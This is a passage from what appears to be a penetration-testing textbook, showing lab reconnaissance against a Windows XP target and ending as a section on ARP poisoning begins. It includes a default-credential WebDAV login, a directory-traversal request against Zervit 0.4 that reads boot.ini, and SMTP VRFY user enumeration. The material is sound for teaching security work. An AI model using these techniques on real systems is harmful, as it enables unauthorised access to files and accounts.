### Potential for Attackers to Gain Foothold via WebDAV

Attackers can potentially upload malicious scripts through the web server, thereby gaining a foothold on the system. As shown in Figure 6-16, WebDAV is indeed present on this server.

**Figure 6-16: WebDAV Installation**

To interact with WebDAV servers, we can use the tool Cadaver. In Listing 6-11, we demonstrate how to use Cadaver to connect to the WebDAV server at `http://192.168.20.10` and test the default credentials.

**Listing 6-11: Using Cadaver**

```bash
root@kali:/# cadaver http://192.168.20.10/webdav
Authentication required for XAMPP with WebDAV on server `192.168.20.10':
Username: wampp
Password:
dav:/webdav/> u
```

The Cadaver login is successful. Our Windows XP target uses the default credentials for WebDAV, which we can exploit. With access to WebDAV, we can now upload files to the web server.

### Manual Vulnerability Analysis

Sometimes, manual vulnerability analysis is more effective than automated tools in identifying potential compromises. Practice is key to improving these skills. In the following sections, we will explore some promising leads from our port and vulnerability scans.

### Exploring an Unusual Port

One port that did not appear in our automated scans is port 3232 on our Windows target. Scanning this port with Nmap (as done in Chapter 5) causes it to crash, suggesting that the listening program is designed to handle specific input and struggles with other types of data.

This behavior is intriguing for penetration testers because programs that crash when handling malformed input are likely not validating input properly. From Chapter 5, we know that the crash output indicated the software is a web server. Connecting to the port with a browser, as shown in Figure 6-17, confirms this.

**Figure 6-17: Web Server on Port 3232**

The web page served does not provide much information, but we can manually connect to the port using Netcat. Since we know it is a web server, we can send a GET request to ask for the default page, as shown in Listing 6-12.

**Listing 6-12: Connecting to a Port with Netcat**

```bash
root@kali:~# nc 192.168.20.10 3232
GET / HTTP/1.1
HTTP/1.1 200 OK
Server: Zervit 0.4
X-Powered-By: Carbono
Connection: close
Accept-Ranges: bytes
Content-Type: text/html
Content-Length: 36
hi
root@bt:~#
```

The server identifies itself as Zervit 0.4, and a quick Google search for "Zervit 0.4 exploit" reveals multiple security issues, including buffer overflow and local file inclusion vulnerabilities. Given the sensitivity of the service, it may be best to avoid buffer overflow attacks. The local file inclusion vulnerability, however, is promising. We can use HTTP GET requests to download sensitive files, such as the `boot.ini` file, as shown in Listing 6-13.

**Listing 6-13: Local File Inclusion in Zervit 0.4**

```bash
root@kali:~# nc 192.168.20.10 3232
GET /../../../../../boot.ini HTTP/1.1
HTTP/1.1 200 OK
Server: Zervit 0.4
X-Powered-By: Carbono
Connection: close
Accept-Ranges: bytes
Content-Type: application/octet-stream
Content-Length: 211
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Home Edition" /fastdetect /NoExecute=OptIn
```

We successfully retrieved the `boot.ini` file, which contains configuration details for the Windows boot process. We can use this local file inclusion to access additional sensitive files in Chapter 8.

### Finding Valid Usernames

Knowing valid usernames can significantly increase the success rate of password attacks. One method to find valid usernames for mail servers is to use the VRFY SMTP command, if available. This command verifies if a user exists. In the previous chapter, NSE found that the VRFY verb is enabled on the Windows XP target. We can use Netcat to check for usernames, as shown in Listing 6-14.

**Listing 6-14: Using the SMTP VRFY Command**

```bash
root@kali:~# nc 192.168.20.10 25
220 georgia.com SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here
VRFY georgia
250 Georgia
VRFY john
551 User not local
```

Using VRFY, we confirm that `georgia` is a valid username, while `john` is not. We will explore using valid usernames to guess passwords in Chapter 9.

### Summary

In this chapter, we explored various methods to identify exploitable vulnerabilities on our targets. We used a variety of tools and techniques to find multiple attack vectors, including the MS08-067 exploit against the Windows XP SMB server and a local file inclusion vulnerability on the Zervit 0.4 web server, allowing us to download system files. Using VRFY, we discovered a valid username for the mail server.

We also identified potential vulnerabilities in the SLMail POP3 service, an open phpMyAdmin installation, and an XAMPP installation with default WebDAV credentials. On the Linux target, we found an NFS share with write access and a TikiWiki installation with a code execution vulnerability. The Vsftpd 2.3.4 FTP server may have a hidden backdoor due to a compromise of the repositories.

Our Windows XP and Linux target machines have numerous issues, while the Windows 7 target appears secure on the surface. Before moving on to exploitation, the next chapter will cover capturing network traffic to gain sensitive information such as login credentials.

### Capturing Network Traffic

Before proceeding to exploitation, we will use Wireshark and other tools to capture and analyze network traffic to gain useful information, such as usernames and passwords, from other machines on the local network. This is particularly relevant in internal penetration tests, where capturing traffic can provide additional insights. However, capturing all traffic can produce a large amount of data, making it challenging to identify useful information.

#### Networking for Capturing Traffic

In a hubbed network, capturing traffic is straightforward because hubs rebroadcast packets to all ports. In a switched network, switches send traffic only to the intended system, so we need to trick the network into sending us the desired traffic. Virtual networks often act like hubs, allowing us to see traffic from all virtual machines. To simulate a non-virtualized network, we will disable promiscuous mode in Wireshark.

#### Using Wireshark

Wireshark is a powerful graphical network protocol analyzer that allows us to inspect individual packets. It can capture and decode various types of traffic, including Ethernet, wireless, and Bluetooth. Let's start by capturing traffic on our local network.

1. **Starting a Wireshark Capture:**
   - Start Wireshark in Kali.
   - Select the local network interface (eth0) and uncheck the "Use promiscuous mode on all interfaces" option.
   - Click "Capture" to begin.

2. **Filtering Traffic:**
   - Use filters to narrow down the captured packets. For example, `ftp` to show only FTP traffic, or `ip.dst==192.168.20.10` to show traffic destined for a specific IP address.

3. **Following a TCP Stream:**
   - Right-click an interesting packet and select "Follow TCP Stream" to view the full conversation.

4. **Dissecting Packets:**
   - Select a packet to see detailed information, such as TCP destination ports.

#### ARP Cache Poisoning

To capture traffic not intended for our Kali system, we need to trick the target machine or the switch into believing the traffic belongs to us. This is known as a man-in-the-middle (MITM) attack.